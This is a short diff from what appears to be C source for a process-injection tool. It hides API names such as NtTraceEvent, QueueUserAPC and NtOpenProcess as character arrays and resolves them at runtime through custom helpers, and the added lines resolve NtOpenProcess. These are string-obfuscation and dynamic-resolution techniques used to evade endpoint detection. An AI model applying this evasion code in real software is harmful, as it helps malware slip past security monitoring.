@@ -30,3 +30,6 @@ char ntTraceEvent[] = {'N','t','T','r','a','c','e','E','v','e','n','t',0};
 WCHAR k3rn3l[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0 };
 char qu3u3[] = { 'Q','u','e','u','e','U','s','e','r','A','P','C',0 };
 myQueueUserAPC pQueueUserAPC = (myQueueUserAPC)hlpGetProcAddress(hlpGetModuleHandle(k3rn3l), qu3u3);
+
+char Op3npr0[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s',0 };
+myNtOpenProcess pOpenProcess = (myNtOpenProcess)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), Op3npr0);
